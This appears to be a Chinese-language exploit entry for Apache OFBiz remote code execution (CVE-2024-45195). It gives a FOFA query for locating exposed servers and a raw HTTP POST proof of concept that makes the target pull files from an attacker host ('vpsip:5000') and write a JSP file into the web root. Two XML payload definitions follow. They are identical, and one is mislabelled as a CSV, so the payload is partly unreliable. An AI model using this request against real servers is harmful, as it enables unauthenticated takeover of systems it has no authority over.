# Apache-OFBiz远程代码执行漏洞(CVE-2024-45195)

Apache OFBiz 远程代码执行漏洞(CVE-2024-45195)，该漏洞允许未经身份验证的远程攻击者通过SSRF漏洞控制请求从而写入恶意文件。攻击者可能利用该漏洞来执行恶意操作，包括但不限于获取敏感信息、修改数据或执行系统命令，最终可导致服务器失陷。

## fofa

```yaml
app="Apache_OFBiz"
```

## poc

```javascript
POST /webtools/control/forgotPassword/viewdatafile HTTP/2
Host: 
User-Agent: Mozilla/5.0 (Windows NT 6.2) AppleWebKit/532.1 (KHTML, like Gecko) Chrome/41.0.887.0 Safari/532.1
Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2
Connection: close
Content-Type: application/x-www-form-urlencoded
 
DATAFILE_LOCATION=http://vpsip:5000/rcereport.csv&DATAFILE_SAVE=./applications/accounting/webapp/accounting/index.jsp&DATAFILE_IS_URL=true&DEFINITION_LOCATION=http://vpsip:5000/rceschema.xml&DEFINITION_IS_URL=true&DEFINITION_NAME=rce
```

### rcereport.csv

```xml-dtd
<data-files xsi:noNamespaceSchemaLocation="http://ofbiz.apache.org/dtds/datafiles.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
        <data-file name="rce" separator-style="fixed-length" type-code="text" start-line="0" encoding-type="UTF-8">
            <record name="rceentry" limit="many">
                <field name="jsp" type="String" length="605" position="0"></field>
            </record>
        </data-file>
</data-files>
```

### rceschema.xml

```xml
<data-files xsi:noNamespaceSchemaLocation="http://ofbiz.apache.org/dtds/datafiles.xsd" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
        <data-file name="rce" separator-style="fixed-length" type-code="text" start-line="0" encoding-type="UTF-8">
            <record name="rceentry" limit="many">
                <field name="jsp" type="String" length="605" position="0"></field>
            </record>
        </data-file>
</data-files>
```

![img](https://sydgz2-1310358933.cos.ap-guangzhou.myqcloud.com/pic/202409081931358.png)